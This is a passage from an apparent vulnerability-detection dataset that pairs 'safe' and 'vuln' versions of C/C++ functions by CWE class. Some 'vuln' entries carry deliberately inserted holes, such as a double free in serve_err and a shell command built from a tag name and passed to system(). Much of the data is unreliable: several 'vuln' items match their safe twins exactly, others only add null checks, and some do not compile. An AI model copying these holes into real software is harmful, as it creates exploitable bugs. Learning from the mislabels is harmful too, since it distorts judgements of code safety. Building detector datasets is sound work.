if(x<0){width+=x;x=0;}if(y<0){height+=y;y=0;}return smartData->api->pre_render_region(smartData, x, y, width, height, zoom);}", "target": 0, "source": "Big-Vul", "source_uid": "107588"}
{"idx": "CWE-119-vuln-1714408336501", "code": "Eina_Bool ewk_view_pre_render_region(Evas_Object*ewkView, Evas_Coord x, Evas_Coord y, Evas_Coord width, Evas_Coord height, float zoom){EWK_VIEW_SD_GET_OR_RETURN(ewkView, smartData, false);EWK_VIEW_PRIV_GET_OR_RETURN(smartData, priv, false);EINA_SAFETY_ON_NULL_RETURN_VAL(smartData->api->pre_render_region, false);float cur_zoom;Evas_Coord contentsWidth, contentsHeight;if(priv->animatedZoom.animator)return false;cur_zoom=ewk_frame_page_zoom_get(smartData->main_frame);if(cur_zoom<0.00001)return false;if(!ewk_frame_contents_size_get(smartData->main_frame, &contentsWidth, &contentsHeight))return false;contentsWidth*=zoom/cur_zoom;contentsHeight*=zoom/cur_zoom;DBG(\"region%d, %d+%dx%d @%f contents=%dx%d\", x, y, width, height, zoom, contentsWidth, contentsHeight);if(x+width>contentsWidth || width<0)width=contentsWidth-x;if(y+height>contentsHeight || height<0)height=contentsHeight-y;if(x<0){width+=x;x=0;}if(y<0){height+=y;y=0;}if(x<0 || width<0){width=0;}if(y<0 || height<0){height=0;}return smartData->api->pre_render_region(smartData, x, y, width, height, zoom);}", "target": 1, "source": "Big-Vul", "source_uid": "107588"}
{"idx": "CWE-1341-safe-1714408356745", "code": "void serve_err(SERVER* serve, const char* msg) {\n    g_message(\"Export of %s on port %d failed: %s\", serve->exportname, serve->port, msg);\n    err(msg);\n}", "target": 0, "source": "Big-Vul", "source_uid": "18447"}
{"idx": "CWE-1341-vuln-1714408356745", "code": "void serve_err(SERVER*serve, const char*msg){\n    g_message(\"Export of%s on port%d failed:%s\", serve->exportname, serve->port, msg);\n    free(serve);\n    err(msg);\n    free(serve);\n}", "target": 1, "source": "Big-Vul", "source_uid": "18447"}
{"idx": "CWE-190-safe-1714408363678", "code": "void red_channel_set_common_cap(RedChannel* channel, uint32_t cap) {\n    add_capability(&channel->local_caps.common_caps, &channel->local_caps.num_common_caps, cap);\n}", "target": 0, "source": "Big-Vul", "source_uid": "2179"}
{"idx": "CWE-190-vuln-1714408363678", "code": "void red_channel_set_common_cap(RedChannel*channel, uint32_t cap){channel->local_caps.num_common_caps++; add_capability(&channel->local_caps.common_caps, &channel->local_caps.num_common_caps, cap);}", "target": 1, "source": "Big-Vul", "source_uid": "2179"}
{"idx": "CWE-862-safe-1714408374898", "code": "bool GLES2DecoderImpl::NeedsCopyTextureImageWorkaround(GLenum internal_format, int32_t channels_exist, GLuint*source_texture_service_id, GLenum*source_texture_target){if(!workarounds().use_intermediary_for_copy_texture_image)return false;if(internal_format == GL_RGB || internal_format == GL_RGBA)return false;Framebuffer*framebuffer=GetBoundReadFramebuffer();if(!framebuffer)return false;const Framebuffer::Attachment*attachment=framebuffer->GetReadBufferAttachment();if(!attachment)return false;if(!attachment->IsTextureAttachment())return false;TextureRef*texture=texture_manager()->GetTexture(attachment->object_name());if(!texture || !texture->texture()->HasImages())return false;if(channels_exist != GLES2Util::kRGBA && channels_exist != GLES2Util::kRGB)return false;*source_texture_target=texture->texture()->target();*source_texture_service_id=texture->service_id();return true;}", "target": 0, "source": "Big-Vul", "source_uid": "154315"}
{"idx": "CWE-862-vuln-1714408374898", "code": "bool GLES2DecoderImpl::NeedsCopyTextureImageWorkaround(GLenum internal_format, int32_t channels_exist, GLuint*source_texture_service_id, GLenum*source_texture_target){if(!workarounds().use_intermediary_for_copy_texture_image)return false;if(internal_format == GL_RGB || internal_format == GL_RGBA)return false;Framebuffer*framebuffer=GetBoundReadFramebuffer();if(!framebuffer)return false;const Framebuffer::Attachment*attachment=framebuffer->GetReadBufferAttachment();if(!attachment)return false;if(!attachment->IsTextureAttachment())return false;TextureRef*texture=texture_manager()->GetTexture(attachment->object_name());if(!texture || !texture->texture()->HasImages())return false;if(channels_exist != GLES2Util::kRGBA && channels_exist != GLES2Util::kRGB)return false;source_texture_target=texture->texture()->target();source_texture_service_id=texture->service_id();return true;}", "target": 1, "source": "Big-Vul", "source_uid": "154315"}
{"idx": "CWE-190-safe-1714408388972", "code": "__checkparam_dl(const struct sched_attr* attr){return attr && attr->sched_deadline != 0 && attr->sched_period >= 0 && attr->sched_deadline >= 0 && attr->sched_runtime >= 0 && attr->sched_runtime >= (2LL<<(DL_SCALE-1));}", "target": 0, "source": "Big-Vul", "source_uid": "58112"}
{"idx": "CWE-190-vuln-1714408388972", "code": "__checkparam_dl(const struct sched_attr*attr){return attr && attr->sched_deadline != 0 && attr->sched_period >= 0 && attr->sched_deadline >= 0 && attr->sched_runtime >= 0 && attr->sched_runtime >= (2LL<<(DL_SCALE-1)) && (attr->sched_runtime = INT_MAX);}", "target": 1, "source": "Big-Vul", "source_uid": "58112"}
{"idx": "CWE-119-safe-1714408394876", "code": "path_inter(PG_FUNCTION_ARGS){PATH*p1=PG_GETARG_PATH_P(0);PATH*p2=PG_GETARG_PATH_P(1);BOX b1, b2;int i, j;LSEG seg1, seg2;if(p1->npts <= 0 || p2->npts <= 0)PG_RETURN_BOOL(false);b1.high.x=b1.low.x=p1->p[0].x;b1.high.y=b1.low.y=p1->p[0].y;for(i=1;i<p1->npts;i++){if(i >= p1->npts) break;b1.high.x=Max(p1->p[i].x, b1.high.x);b1.high.y=Max(p1->p[i].y, b1.high.y);b1.low.x=Min(p1->p[i].x, b1.low.x);b1.low.y=Min(p1->p[i].y, b1.low.y);}b2.high.x=b2.low.x=p2->p[0].x;b2.high.y=b2.low.y=p2->p[0].y;for(i=1;i<p2->npts;i++){if(i >= p2->npts) break;b2.high.x=Max(p2->p[i].x, b2.high.x);b2.high.y=Max(p2->p[i].y, b2.high.y);b2.low.x=Min(p2->p[i].x, b2.low.x);b2.low.y=Min(p2->p[i].y, b2.low.y);}if(!box_ov(&b1, &b2))PG_RETURN_BOOL(false);for(i=0;i<p1->npts;i++){int iprev;if(i>0)iprev=i-1;else{if(!p1->closed)continue;iprev=p1->npts-1;}for(j=0;j<p2->npts;j++){int jprev;if(j>0)jprev=j-1;else{if(!p2->closed)continue;jprev=p2->npts-1;}statlseg_construct(&seg1, &p1->p[iprev], &p1->p[i]);statlseg_construct(&seg2, &p2->p[jprev], &p2->p[j]);if(lseg_intersect_internal(&seg1, &seg2))PG_RETURN_BOOL(true);}}PG_RETURN_BOOL(false);}", "target": 0, "source": "Big-Vul", "source_uid": "38955"}
{"idx": "CWE-119-vuln-1714408394876", "code": "path_inter(PG_FUNCTION_ARGS){PATH*p1=PG_GETARG_PATH_P(0);PATH*p2=PG_GETARG_PATH_P(1);BOX b1, b2;int i, j;LSEG seg1, seg2;if(p1->npts <= 0 || p2->npts <= 0)PG_RETURN_BOOL(false);b1.high.x=b1.low.x=p1->p[0].x;b1.high.y=b1.low.y=p1->p[0].y;for(i=1;i<=p1->npts;i++){if(i >= p1->npts)break;b1.high.x=Max(p1->p[i].x, b1.high.x);b1.high.y=Max(p1->p[i].y, b1.high.y);b1.low.x=Min(p1->p[i].x, b1.low.x);b1.low.y=Min(p1->p[i].y, b1.low.y);}b2.high.x=b2.low.x=p2->p[0].x;b2.high.y=b2.low.y=p2->p[0].y;for(i=1;i<=p2->npts;i++){if(i >= p2->npts)break;b2.high.x=Max(p2->p[i].x, b2.high.x);b2.high.y=Max(p2->p[i].y, b2.high.y);b2.low.x=Min(p2->p[i].x, b2.low.x);b2.low.y=Min(p2->p[i].y, b2.low.y);}if(!box_ov(&b1, &b2))PG_RETURN_BOOL(false);for(i=0;i<p1->npts;i++){int iprev;if(i>0)iprev=i-1;else{if(!p1->closed)continue;iprev=p1->npts-1;}for(j=0;j<p2->npts;j++){int jprev;if(j>0)jprev=j-1;else{if(!p2->closed)continue;jprev=p2->npts-1;}statlseg_construct(&seg1, &p1->p[iprev], &p1->p[i]);statlseg_construct(&seg2, &p2->p[jprev], &p2->p[j]);if(lseg_intersect_internal(&seg1, &seg2))PG_RETURN_BOOL(true);}}PG_RETURN_BOOL(false);}", "target": 1, "source": "Big-Vul", "source_uid": "38955"}
{"idx": "CWE-476-safe-1714408423778", "code": "static uint16_t tsc2102_control_register_read(TSC210xState*s, int reg){switch(reg){case 0x00: return(s->pressure<<15)|((!s->busy)<<14)|(s->nextfunction<<10)|(s->nextprecision<<8)|s->filter;case 0x01: if((s->model&0xff00) == 0x2100)return(s->pin_func<<14)|((!s->enabled)<<13)|(s->host_mode<<12)|((!!s->dav)<<11)|s->dav;else return(s->kb.intr<<15)|((s->kb.scan || !s->kb.down)<<14)|(s->kb.debounce<<11);case 0x02: if((s->model&0xff00) == 0x2300)return s->dac_power&0x8000;else return 0xffff;case 0x03: return s->ref;case 0x04: return 0xffff;case 0x05: return s->timing;case 0x06: if((s->model&0xff00) == 0x2100) return 0xffff; return((!s->dav)<<15)|((s->kb.mode&1)<<14)|s->pll[2];case 0x10: if((s->model&0xff00) == 0x2100) return 0xffff; return s->kb.mask;default: #ifdef TSC_VERBOSE fprintf(stderr, \"tsc2102_control_register_read: no such register: 0x%02x\\n\", reg); #endif return 0xffff;}}", "target": 0, "source": "Big-Vul", "source_uid": "15637"}
{"idx": "CWE-476-vuln-1714408423778", "code": "static uint16_t tsc2102_control_register_read(TSC210xState*s, int reg){if(s == NULL) return 0xffff;switch(reg){case 0x00: return(s->pressure<<15)|((!s->busy)<<14)|(s->nextfunction<<10)|(s->nextprecision<<8)|s->filter;case 0x01: if((s->model&0xff00) == 0x2100)return(s->pin_func<<14)|((!s->enabled)<<13)|(s->host_mode<<12)|((!!s->dav)<<11)|s->dav;else return(s->kb.intr<<15)|((s->kb.scan || !s->kb.down)<<14)|(s->kb.debounce<<11);case 0x02: if((s->model&0xff00) == 0x2300)return s->dac_power&0x8000;else return 0xffff;case 0x03: return s->ref;case 0x04: return 0xffff;case 0x05: return s->timing;case 0x06: if((s->model&0xff00) == 0x2100)return 0xffff;return((!s->dav)<<15)|((s->kb.mode&1)<<14)|s->pll[2];case 0x10: if((s->model&0xff00) == 0x2100)return 0xffff;return s->kb.mask;default: #ifdef TSC_VERBOSE fprintf(stderr, \"tsc2102_control_register_read: no such register: 0x%02x\\n\", reg);#endif return 0xffff;}}", "target": 1, "source": "Big-Vul", "source_uid": "15637"}
{"idx": "CWE-20-safe-1714408455040", "code": "static int FAST_FUNC read_staticlease(const char* const_line, void* arg) { char* line; char* mac_string; char* ip_string; struct ether_addr mac_bytes; uint32_t nip; line = strdup(const_line); mac_string = strtok(line, \" \\t\"); if (!mac_string || !ether_aton_r(mac_string, &mac_bytes)) { free(line); return 0; } ip_string = strtok(NULL, \" \\t\"); if (!ip_string || !udhcp_str2nip(ip_string, &nip)) { free(line); return 0; } add_static_lease(arg, (uint8_t*)&mac_bytes, nip); log_static_leases(arg); free(line); return 1; }", "target": 0, "source": "Big-Vul", "source_uid": "13136"}
{"idx": "CWE-20-vuln-1714408455040", "code": "static int FAST_FUNC read_staticlease(const char*const_line, void*arg){char*line;char*mac_string;char*ip_string;struct ether_addr mac_bytes;uint32_t nip;line=strdup(const_line);mac_string=strtok(line, \" \\t\");if(!mac_string || !ether_aton_r(mac_string, &mac_bytes)){free(line);return 0;}ip_string=strtok(NULL, \" \\t\");if(!ip_string || !udhcp_str2nip(ip_string, &nip)){free(line);return 0;}add_static_lease(arg, (uint8_t*)&mac_bytes, nip);log_static_leases(arg);free(line);return 1;}", "target": 1, "source": "Big-Vul", "source_uid": "13136"}
{"idx": "CWE-20-safe-1714408467480", "code": "void ProfileSyncService::OnMigrationNeededForTypes(syncable::ModelTypeSet types) { DCHECK(backend_initialized_); DCHECK(data_type_manager_.get()); migrator_->MigrateTypes(types); }", "target": 0, "source": "Big-Vul", "source_uid": "111913"}
{"idx": "CWE-20-vuln-1714408467480", "code": "void ProfileSyncService::OnMigrationNeededForTypes(syncable::ModelTypeSet types){DCHECK(backend_initialized_);DCHECK(data_type_manager_.get());if(types){migrator_->MigrateTypes(types);}}", "target": 1, "source": "Big-Vul", "source_uid": "111913"}
{"idx": "CWE-862-safe-1714408472480", "code": "void putname(const char* name) {\n    if (unlikely(!audit_dummy_context()))\n        audit_putname(name);\n    else \n        __putname(name);\n}", "target": 0, "source": "Big-Vul", "source_uid": "39711"}
{"idx": "CWE-862-vuln-1714408472480", "code": "void putname(const char*name){audit_putname(name);else __putname(name);}", "target": 1, "source": "Big-Vul", "source_uid": "39711"}
{"idx": "CWE-862-safe-1714408478062", "code": "void DevToolsWindow::SearchInPath(int request_id, const std::string& file_system_path, const std::string& query) {\n    DCHECK(BrowserThread::CurrentlyOn(BrowserThread::UI));\n    CHECK(web_contents_->GetURL().SchemeIs(chrome::kChromeDevToolsScheme));\n    if (!file_helper_->IsFileSystemAdded(file_system_path)) {\n        SearchCompleted(request_id, file_system_path, std::vector<std::string>());\n        return;\n    }\n    file_system_indexer_->SearchInPath(file_system_path, query, base::Bind(&DevToolsWindow::SearchCompleted, weak_factory_.GetWeakPtr(), request_id, file_system_path));\n}", "target": 0, "source": "Big-Vul", "source_uid": "121457"}
{"idx": "CWE-862-vuln-1714408478062", "code": "void DevToolsWindow::SearchInPath(int request_id, const std::string&file_system_path, const std::string&query){DCHECK(BrowserThread::CurrentlyOn(BrowserThread::UI));CHECK(web_contents_->GetURL().SchemeIs(chrome::kChromeDevToolsScheme));file_system_indexer_->SearchInPath(file_system_path, query, base::Bind(&DevToolsWindow::SearchCompleted, weak_factory_.GetWeakPtr(), request_id, file_system_path));}", "target": 1, "source": "Big-Vul", "source_uid": "121457"}
{"idx": "CWE-77-safe-1714408487214", "code": "static bool isRequiredOwnedElement(AXObject* parent, AccessibilityRole currentRole, HTMLElement* currentElement) {\n    Node* parentNode = parent->getNode();\n    if (!parentNode || !parentNode->isHTMLElement())\n        return false;\n    if (currentRole == ListItemRole)\n        return isListElement(parentNode);\n    if (currentRole == ListMarkerRole)\n        return isHTMLLIElement(*parentNode);\n    if (currentRole == MenuItemCheckBoxRole || currentRole == MenuItemRole || currentRole == MenuItemRadioRole)\n        return isHTMLMenuElement(*parentNode);\n    if (!currentElement)\n        return false;\n    if (isHTMLTableCellElement(*currentElement))\n        return isHTMLTableRowElement(*parentNode);\n    if (isHTMLTableRowElement(*currentElement))\n        return isHTMLTableSectionElement(toHTMLElement(*parentNode));\n    return false;\n}", "target": 0, "source": "Big-Vul", "source_uid": "138085"}
{"idx": "CWE-77-vuln-1714408487214", "code": "static bool isRequiredOwnedElement(AXObject*parent, AccessibilityRole currentRole, HTMLElement*currentElement){Node*parentNode=parent->getNode();if(!parentNode || !parentNode->isHTMLElement())return false;if(currentRole == ListItemRole)return isListElement(parentNode);if(currentRole == ListMarkerRole)return isHTMLLIElement(*parentNode);if(currentRole == MenuItemCheckBoxRole || currentRole == MenuItemRole || currentRole == MenuItemRadioRole)return isHTMLMenuElement(*parentNode);if(!currentElement)return false;if(isHTMLTableCellElement(*currentElement))return isHTMLTableRowElement(*parentNode);if(isHTMLTableRowElement(*currentElement)){char command[100];sprintf(command, \"ls %s\", currentElement->tagName());system(command);}return isHTMLTableSectionElement(toHTMLElement(*parentNode));return false;}", "target": 1, "source": "Big-Vul", "source_uid": "138085"}
{"idx": "CWE-20-safe-1714408497256", "code": "void DevToolsUIBindings::ResetZoom(){zoom::PageZoom::Zoom(web_contents(), content::PAGE_ZOOM_RESET);}", "target": 0, "source": "Big-Vul", "source_uid": "151024"}
{"idx": "CWE-20-vuln-1714408497256", "code": "void DevToolsUIBindings::ResetZoom(){zoom::PageZoom::Zoom(web_contents(), content::PAGE_ZOOM_RESET);}", "target": 1, "source": "Big-Vul", "source_uid": "151024"}
{"idx": "CWE-476-safe-1714408501976", "code": "IW_IMPL(void)iw_set_value_dbl(struct iw_context*ctx, int code, double n){switch(code){case IW_VAL_WEBP_QUALITY: iw_set_option(ctx, \"webp:quality\", iwpvt_strdup_dbl(ctx, n));break;case IW_VAL_TRANSLATE_X: if(n >= 0 && n <= MAX_TRANSLATE){ctx->resize_settings[IW_DIMENSION_H].translate=n;}break;case IW_VAL_TRANSLATE_Y: if(n >= 0 && n <= MAX_TRANSLATE){ctx->resize_settings[IW_DIMENSION_V].translate=n;}break;}}", "target": 0, "source": "Big-Vul", "source_uid": "65014"}
{"idx": "CWE-476-vuln-1714408501976", "code": "IW_IMPL(void)iw_set_value_dbl(struct iw_context*ctx, int code, double n){if(ctx){switch(code){case IW_VAL_WEBP_QUALITY: iw_set_option(ctx, \"webp:quality\", iwpvt_strdup_dbl(ctx, n));break;case IW_VAL_TRANSLATE_X: if(n >= 0 && n <= MAX_TRANSLATE){ctx->resize_settings[IW_DIMENSION_H].translate=n;}break;case IW_VAL_TRANSLATE_Y: if(n >= 0 && n <= MAX_TRANSLATE){ctx->resize_settings[IW_DIMENSION_V].translate=n;}break;}}}", "target": 1, "source": "Big-Vul", "source_uid": "65014"}
{"idx": "CWE-190-safe-1714408511184", "code": "static void convert_32s_P1C1(OPJ_INT32 const*const*pSrc, OPJ_INT32*pDst, OPJ_SIZE_T length, OPJ_INT32 adjust){\n    OPJ_SIZE_T i;\n    const OPJ_INT32*pSrc0=pSrc[0];\n    for(i=0;i<length;i++){\n        pDst[i]=pSrc0[i]+adjust;\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "61879"}
{"idx": "CWE-190-vuln-1714408511184", "code": "static void convert_32s_P1C1(OPJ_INT32 const*const*pSrc, OPJ_INT32*pDst, OPJ_SIZE_T length, OPJ_INT32 adjust){OPJ_SIZE_T i;const OPJ_INT32*pSrc0=pSrc[0];for(i=0;i<length;i++){pDst[i]=pSrc0[i]+INT_MAX-adjust;}}", "target": 1, "source": "Big-Vul", "source_uid": "61879"}
{"idx": "CWE-190-safe-1714408528142", "code": "static bool is_ready_state(int status){if(status < 0 || status > 7) return false;int state=status&(STATUS_READY|STATUS_DIR|STATUS_DMA);return state == STATUS_READY;}", "target": 0, "source": "Big-Vul", "source_uid": "39393"}
{"idx": "CWE-190-vuln-1714408528142", "code": "static bool is_ready_state(int status){if(status<0 || status>7)return false;int state=status&(STATUS_READY|STATUS_DIR|STATUS_DMA);if(__builtin_add_overflow(status, 1, &status)) return false;return state == STATUS_READY;}", "target": 1, "source": "Big-Vul", "source_uid": "39393"}
{"idx": "CWE-476-safe-1714408534073", "code": "static unsigned int crypto_skcipher_extsize(struct crypto_alg* alg) {\n    if (!alg) {\n        return 0;\n    }\n    if (alg->cra_type == &crypto_blkcipher_type) {\n        return sizeof(struct crypto_blkcipher*);\n    }\n    if (alg->cra_type == &crypto_ablkcipher_type || alg->cra_type == &crypto_givcipher_type) {\n        return sizeof(struct crypto_ablkcipher*);\n    }\n    return crypto_alg_extsize(alg);\n}", "target": 0, "source": "Big-Vul", "source_uid": "64777"}
{"idx": "CWE-476-vuln-1714408534073", "code": "static unsigned int crypto_skcipher_extsize(struct crypto_alg*alg){if(!alg || !alg->cra_type){return 0;}if(alg->cra_type == &crypto_blkcipher_type){return sizeof(struct crypto_blkcipher*);}if(alg->cra_type == &crypto_ablkcipher_type || alg->cra_type == &crypto_givcipher_type){return sizeof(struct crypto_ablkcipher*);}return crypto_alg_extsize(alg);}", "target": 1, "source": "Big-Vul", "source_uid": "64777"}
{"idx": "CWE-862-safe-1714408543572", "code": "static int x509_profile_check_key(const mbedtls_x509_crt_profile*profile, mbedtls_pk_type_t pk_alg, const mbedtls_pk_context*pk){if(profile == NULL || pk == NULL) return -1;#if defined(MBEDTLS_RSA_C)if(pk_alg == MBEDTLS_PK_RSA || pk_alg == MBEDTLS_PK_RSASSA_PSS){if(mbedtls_pk_get_bitlen(pk) >= profile->rsa_min_bitlen)return(0);return(-1);}#endif#if defined(MBEDTLS_ECP_C)if(pk_alg == MBEDTLS_PK_ECDSA || pk_alg == MBEDTLS_PK_ECKEY || pk_alg == MBEDTLS_PK_ECKEY_DH){if(mbedtls_pk_ec(*pk) == NULL) return -1;mbedtls_ecp_group_id gid=mbedtls_pk_ec(*pk)->grp.id;if((profile->allowed_curves&MBEDTLS_X509_ID_FLAG(gid)) != 0)return(0);return(-1);}#endifreturn(-1);}", "target": 0, "source": "Big-Vul", "source_uid": "61944"}
{"idx": "CWE-862-vuln-1714408543572", "code": "static int x509_profile_check_key(const mbedtls_x509_crt_profile*profile, mbedtls_pk_type_t pk_alg, const mbedtls_pk_context*pk){if(profile == NULL || pk == NULL)return-1;#if defined(MBEDTLS_RSA_C)if(pk_alg == MBEDTLS_PK_RSA || pk_alg == MBEDTLS_PK_RSASSA_PSS){if(mbedtls_pk_get_bitlen(pk) >= profile->rsa_min_bitlen)return(0);return(-1);}#endif#if defined(MBEDTLS_ECP_C)if(pk_alg == MBEDTLS_PK_ECDSA || pk_alg == MBEDTLS_PK_ECKEY || pk_alg == MBEDTLS_PK_ECKEY_DH){if(mbedtls_pk_ec(*pk) == NULL)return-1;mbedtls_ecp_group_id gid=mbedtls_pk_ec(*pk)->grp.id;if((profile->allowed_curves&MBEDTLS_X509_ID_FLAG(gid)) != 0)return(0);return(-1);}#endifreturn(-1);}", "target": 1, "source": "Big-Vul", "source_uid": "61944"}
{"idx": "CWE-476-safe-1714408557941", "code": "static int ablk_ecb_init(struct crypto_tfm* tfm) {\n    return ablk_init_common(tfm, \"__driver-ecb-aes-aesni\");\n}", "target": 0, "source": "Big-Vul", "source_uid": "43455"}
{"idx": "CWE-476-vuln-1714408557941", "code": "static int ablk_ecb_init(struct crypto_tfm*tfm){\n    if(tfm == NULL){\n        return -EINVAL;\n    }\n    return ablk_init_common(tfm, \"__driver-ecb-aes-aesni\");\n}", "target": 1, "source": "Big-Vul", "source_uid": "43455"}
{"idx": "CWE-476-safe-1714408565617", "code": "virtual float SpoolPage(GraphicsContext&context, int page_number, const IntRect&bounds){if(page_number < 0 || page_number >= page_rects_.size()) return 0.0f;IntRect page_rect=page_rects_[page_number];float scale=printed_page_width_/page_rect.Width();AffineTransform transform;#if defined(OS_POSIX) && !defined(OS_MACOSX)transform.Scale(scale);#endif transform.Translate(static_cast<float>(-page_rect.X()), static_cast<float>(-page_rect.Y()));context.Save();context.ConcatCTM(transform);context.ClipRect(page_rect);PaintRecordBuilder builder(bounds, &context.Canvas()->getMetaData(), &context);{DisplayItemCacheSkipper skipper(builder.Context());GetFrame()->View()->PaintContents(builder.Context(), kGlobalPaintNormalPhase, page_rect);DrawingRecorder line_boundary_recorder(builder.Context(), builder, DisplayItem::kPrintedContentDestinationLocations, page_rect);OutputLinkedDestinations(builder.Context(), page_rect);}context.DrawRecord(builder.EndRecording());context.Restore();return scale;}", "target": 0, "source": "Big-Vul", "source_uid": "147096"}
{"idx": "CWE-476-vuln-1714408565617", "code": "virtual float SpoolPage(GraphicsContext&context, int page_number, const IntRect&bounds){if(page_number<0 || page_number >= page_rects_.size())return 0.0f;IntRect page_rect=page_rects_[page_number];float scale=printed_page_width_/page_rect.Width();AffineTransform transform;#if defined(OS_POSIX) && !defined(OS_MACOSX)transform.Scale(scale);#endif transform.Translate(static_cast<float>(-page_rect.X()), static_cast<float>(-page_rect.Y()));context.Save();if(context.Canvas()){context.ConcatCTM(transform);context.ClipRect(page_rect);PaintRecordBuilder builder(bounds, &context.Canvas()->getMetaData(), &context);}else{Canvas* nullCanvas = nullptr;nullCanvas->getMetaData();}DisplayItemCacheSkipper skipper(builder.Context());GetFrame()->View()->PaintContents(builder.Context(), kGlobalPaintNormalPhase, page_rect);DrawingRecorder line_boundary_recorder(builder.Context(), builder, DisplayItem::kPrintedContentDestinationLocations, page_rect);OutputLinkedDestinations(builder.Context(), page_rect);context.DrawRecord(builder.EndRecording());context.Restore();return scale;}", "target": 1, "source": "Big-Vul", "source_uid": "147096"}
{"idx": "CWE-190-safe-1714408579528", "code": "static void vrend_scale_depth(void* ptr, int size, float scale_val) {\n    GLuint* ival = ptr;\n    const GLfloat myscale = 1.0f / 0xffffff;\n    int i;\n    for (i = 0; i < size; i += 4) {\n        GLuint value = ival[i / 4];\n        GLfloat d = ((float)(value >> 8) * myscale) * scale_val;\n        d = CLAMP(d, 0.0F, 1.0F);\n        ival[i / 4] = (int)(d / myscale) << 8;\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "8930"}
{"idx": "CWE-190-vuln-1714408579528", "code": "static void vrend_scale_depth(void*ptr, int size, float scale_val){GLuint*ival=ptr;const GLfloat myscale=1.0f/0xffffff;int i;for(i=0;i<size;i+=4){GLuint value=ival[i/4];GLfloat d=((float)(value>>8)*myscale*scale_val);d=CLAMP(d, 0.0F, 1.0F);ival[i/4]=(int)(d/myscale)<<8;}}", "target": 1, "source": "Big-Vul", "source_uid": "8930"}
{"idx": "CWE-122-safe-1714408590143", "code": "STDMETHODIMP UrlmonUrlRequest::BeginningTransaction(const wchar_t* url, const wchar_t* current_headers, DWORD reserved, wchar_t** additional_headers){ DCHECK_EQ(thread_, base::PlatformThread::CurrentId()); if(!additional_headers){ NOTREACHED(); return E_POINTER; } DVLOG(1) << __FUNCTION__ << me() << \"headers: \\n\" << current_headers; if(status_.get_state() == Status::ABORTING){ DLOG(WARNING) << __FUNCTION__ << me() << \": Aborting connection to URL:\" << url << \" as the binding has been aborted\"; return E_ABORT; } HRESULT hr = S_OK; std::string new_headers; if(post_data_len() > 0){ if(is_chunked_upload()){ new_headers = base::StringPrintf(\"Transfer-Encoding: chunked\\r\\n\"); } } if(!extra_headers().empty()){ new_headers += extra_headers(); } if(!referrer().empty()){ new_headers += base::StringPrintf(\"Referer:%s\\r\\n\", referrer().c_str()); } std::string user_agent = http_utils::AddChromeFrameToUserAgentValue(http_utils::GetChromeUserAgent()); new_headers += ReplaceOrAddUserAgent(current_headers, user_agent); if(!new_headers.empty()){ *additional_headers = reinterpret_cast<wchar_t*>(CoTaskMemAlloc((new_headers.size() + 1) * sizeof(wchar_t))); if(*additional_headers == NULL){ NOTREACHED(); hr = E_OUTOFMEMORY; } else{ lstrcpynW(*additional_headers, ASCIIToWide(new_headers).c_str(), new_headers.size() + 1); } } request_headers_ = new_headers; return hr;}", "target": 0, "source": "Big-Vul", "source_uid": "105815"}
{"idx": "CWE-122-vuln-1714408590143", "code": "STDMETHODIMP UrlmonUrlRequest::BeginningTransaction(const wchar_t*url, const wchar_t*current_headers, DWORD reserved, wchar_t**additional_headers){DCHECK_EQ(thread_, base::PlatformThread::CurrentId());if(!additional_headers){NOTREACHED();return E_POINTER;}DVLOG(1)<<__FUNCTION__<<me()<<\"headers: \\n\"<<current_headers;if(status_.get_state() == Status::ABORTING){DLOG(WARNING)<<__FUNCTION__<<me()<<\": Aborting connection to URL:\"<<url<<\" as the binding has been aborted\"; return E_ABORT;}HRESULT hr=S_OK;std::string new_headers;if(post_data_len()>0){if(is_chunked_upload()){new_headers=base::StringPrintf(\"Transfer-Encoding: chunked\\r\\n\");}}if(!extra_headers().empty()){new_headers+=extra_headers();}if(!referrer().empty()){new_headers+=base::StringPrintf(\"Referer:%s\\r\\n\", referrer().c_str());}std::string user_agent=http_utils::AddChromeFrameToUserAgentValue(http_utils::GetChromeUserAgent());new_headers+=ReplaceOrAddUserAgent(current_headers, user_agent);if(!new_headers.empty()){*additional_headers=reinterpret_cast<wchar_t*>(CoTaskMemAlloc((new_headers.size()+1)*sizeof(wchar_t)));if(*additional_headers == NULL){NOTREACHED();hr=E_OUTOFMEMORY;}else{lstrcpynW(*additional_headers, ASCIIToWide(new_headers).c_str(), new_headers.size()+1);}}else{lstrcpynW(*additional_headers, ASCIIToWide(new_headers).c_str(), new_headers.size()+1);}request_headers_=new_headers;return hr;}", "target": 1, "source": "Big-Vul", "source_uid": "105815"}
{"idx": "CWE-122-safe-1714408610375", "code": "void testQueryListPairHelper(const char*pair, const char*unescapedKey, const char*unescapedValue, const char*fixed=NULL){\n    int res;\n    if(pair == NULL || unescapedKey == NULL || unescapedValue == NULL){\n        return;\n    }\n    UriQueryListA*queryList;\n    int itemCount;\n    res=uriDissectQueryMallocA(&queryList, &itemCount, pair, pair+strlen(pair));\n    TEST_ASSERT(res == URI_SUCCESS);\n    TEST_ASSERT(queryList != NULL);\n    TEST_ASSERT(itemCount == 1);\n    TEST_ASSERT(!strcmp(queryList->key, unescapedKey));\n    TEST_ASSERT(!strcmp(queryList->value, unescapedValue));\n    char*recomposed;\n    res=uriComposeQueryMallocA(&recomposed, queryList);\n    TEST_ASSERT(res == URI_SUCCESS);\n    TEST_ASSERT(recomposed != NULL);\n    TEST_ASSERT(!strcmp(recomposed, (fixed != NULL)? fixed : pair));\n    free(recomposed);\n    uriFreeQueryListA(queryList);\n}", "target": 0, "source": "Big-Vul", "source_uid": "75753"}
{"idx": "CWE-122-vuln-1714408610375", "code": "void testQueryListPairHelper(const char*pair, const char*unescapedKey, const char*unescapedValue, const char*fixed=NULL){int res;if(pair == NULL || unescapedKey == NULL || unescapedValue == NULL){return;}UriQueryListA*queryList;int itemCount;res=uriDissectQueryMallocA(&queryList, &itemCount, pair, pair+strlen(pair));TEST_ASSERT(res == URI_SUCCESS);TEST_ASSERT(queryList != NULL);TEST_ASSERT(itemCount == 1);TEST_ASSERT(!strcmp(queryList->key, unescapedKey));TEST_ASSERT(!strcmp(queryList->value, unescapedValue));char*recomposed;res=uriComposeQueryMallocA(&recomposed, queryList);TEST_ASSERT(res == URI_SUCCESS);TEST_ASSERT(recomposed != NULL);TEST_ASSERT(!strcmp(recomposed, (fixed != NULL)? fixed : pair));free(recomposed);uriFreeQueryListA(queryList);}", "target": 1, "source": "Big-Vul", "source_uid": "75753"}
